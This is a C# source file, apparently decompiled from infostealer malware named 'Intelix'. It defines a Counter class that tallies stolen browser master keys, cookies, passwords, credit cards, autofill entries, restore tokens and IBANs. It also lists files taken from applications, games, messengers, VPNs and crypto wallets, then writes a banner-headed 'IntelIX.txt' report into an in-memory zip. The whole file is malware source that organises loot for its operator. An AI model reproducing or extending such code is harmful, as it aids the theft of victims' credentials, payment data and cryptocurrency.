using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Intelix.Helper.Encrypted;

namespace Intelix.Helper.Data;

public class Counter
{
	public class CounterBrowser
	{
		public string Profile;

		public string BrowserName;

		public ConcurrentLong Cookies = new ConcurrentLong(0);

		public ConcurrentLong Password = new ConcurrentLong(0);

		public ConcurrentLong CreditCards = new ConcurrentLong(0);

		public ConcurrentLong AutoFill = new ConcurrentLong(0);

		public ConcurrentLong RestoreToken = new ConcurrentLong(0);

		public ConcurrentLong MaskCreditCard = new ConcurrentLong(0);

		public ConcurrentLong MaskedIban = new ConcurrentLong(0);
	}

	public class CounterApplications
	{
		public string Name;

		public ConcurrentBag<string> Files = new ConcurrentBag<string>();
	}

	public ConcurrentBag<string> FilesGrabber = new ConcurrentBag<string>();

	public ConcurrentBag<string> CryptoDesktop = new ConcurrentBag<string>();

	public ConcurrentBag<string> CryptoChromium = new ConcurrentBag<string>();

	public ConcurrentBag<CounterBrowser> Browsers = new ConcurrentBag<CounterBrowser>();

	public ConcurrentBag<CounterApplications> Applications = new ConcurrentBag<CounterApplications>();

	public ConcurrentBag<CounterApplications> Vpns = new ConcurrentBag<CounterApplications>();

	public ConcurrentBag<CounterApplications> Games = new ConcurrentBag<CounterApplications>();

	public ConcurrentBag<CounterApplications> Messangers = new ConcurrentBag<CounterApplications>();

	public void Collect(InMemoryZip zip)
	{
		List<string> list = new List<string>();
        list.Add("\r\n                                          \r\n _____         _ \r\n|_   _|____  _(_)\r\n  | |/ _ \\ \\/ / |\r\n  | | (_) >  <| |\r\n  |_|\\___/_/\\_\\_|\r\n                 ");
        list.Add("                               Developer @tcixt");
        list.Add("");
		List<string[]> masterKeys = LocalState.GetMasterKeys();
		if (masterKeys.Count() > 0)
		{
			list.Add(string.Format("[Keys]  [--{0}--]  [{1}]", masterKeys.Count(), string.Join(", ", masterKeys.Select((string[] k) => Paths.GetBrowserName(k[0])).Distinct())));
			foreach (string[] item in masterKeys)
			{
				list.Add("       [" + Paths.GetBrowserName(item[0]) + " " + item[1] + "] " + item[2]);
			}
			list.Add("");
		}
		if (Browsers.Count() > 0)
		{
			list.Add(string.Format("[Browsers]  [--{0}--]  [{1}]", Browsers.Count(), string.Join(", ", Browsers.Select((CounterBrowser b) => b.BrowserName).ToArray())));
			foreach (CounterBrowser browser in Browsers)
			{
				list.Add("  - " + browser.Profile);
				if ((long)browser.Cookies != 0L)
				{
					list.Add($"       [Cookies {(long)browser.Cookies}]");
				}
				if ((long)browser.Password != 0L)
				{
					list.Add($"       [Passwords {(long)browser.Password}]");
				}
				if ((long)browser.CreditCards != 0L)
				{
					list.Add($"       [CreditCards {(long)browser.CreditCards}]");
				}
				if ((long)browser.AutoFill != 0L)
				{
					list.Add($"       [AutoFill {(long)browser.AutoFill}]");
				}
				if ((long)browser.RestoreToken != 0L)
				{
					list.Add($"       [RestoreToken {(long)browser.RestoreToken}]");
				}
				if ((long)browser.MaskCreditCard != 0L)
				{
					list.Add($"       [MaskCreditCard {(long)browser.MaskCreditCard}]");
				}
				if ((long)browser.MaskedIban != 0L)
				{
					list.Add($"       [MaskedIban {(long)browser.MaskedIban}]");
				}
				list.Add("");
			}
			list.Add("");
		}
		if (Applications.Count() > 0)
		{
			list.Add(string.Format("[Applications]  [--{0}--]  [{1}]", Applications.Count(), string.Join(", ", Applications.Select((CounterApplications b) => b.Name).ToArray())));
			foreach (CounterApplications application in Applications)
			{
				list.Add("     [Name " + application.Name + "]");
				foreach (string item2 in application.Files.Reverse())
				{
					list.Add("       - " + item2);
				}
				list.Add("");
			}
			list.Add("");
		}
		if (Games.Count() > 0)
		{
			list.Add(string.Format("[Games]  [--{0}--]  [{1}]", Games.Count(), string.Join(", ", Games.Select((CounterApplications b) => b.Name).ToArray())));
			foreach (CounterApplications game in Games)
			{
				list.Add("     [Name " + game.Name + "]");
				foreach (string item3 in game.Files.Reverse())
				{
					list.Add("       - " + item3);
				}
				list.Add("");
			}
			list.Add("");
		}
		if (Messangers.Count() > 0)
		{
			list.Add(string.Format("[Messangers]  [--{0}--]  [{1}]", Messangers.Count(), string.Join(", ", Messangers.Select((CounterApplications b) => b.Name).ToArray())));
			foreach (CounterApplications messanger in Messangers)
			{
				list.Add("     [Name " + messanger.Name + "]");
				foreach (string item4 in messanger.Files.Reverse())
				{
					list.Add("       - " + item4);
				}
				list.Add("");
			}
			list.Add("");
		}
		if (Vpns.Count() > 0)
		{
			list.Add(string.Format("[Vpns]  [--{0}--]  [{1}]", Vpns.Count(), string.Join(", ", Vpns.Select((CounterApplications b) => b.Name).ToArray())));
			foreach (CounterApplications vpn in Vpns)
			{
				list.Add("     [Name " + vpn.Name + "]");
				foreach (string item5 in vpn.Files.Reverse())
				{
					list.Add("       - " + item5);
				}
				list.Add("");
			}
			list.Add("");
		}
		if (CryptoChromium.Count() > 0)
		{
			list.Add($"[CryptoChromium]  [--{CryptoChromium.Count()}--]");
			foreach (string item6 in CryptoChromium)
			{
				list.Add("  - " + item6);
			}
			list.Add("");
		}
		if (CryptoDesktop.Count() > 0)
		{
			list.Add($"[CryptoDesktop]  [--{CryptoDesktop.Count()}--]");
			foreach (string item7 in CryptoDesktop)
			{
				list.Add("  - " + item7);
			}
			list.Add("");
		}
		if (FilesGrabber.Count() > 0)
		{
			list.Add($"[FilesGrabber]  [--{FilesGrabber.Count()}--]");
			foreach (string item8 in FilesGrabber)
			{
				list.Add("  - " + item8);
			}
			list.Add("");
		}
		zip.AddTextFile("IntelIX.txt", string.Join("\n", list));
	}
}
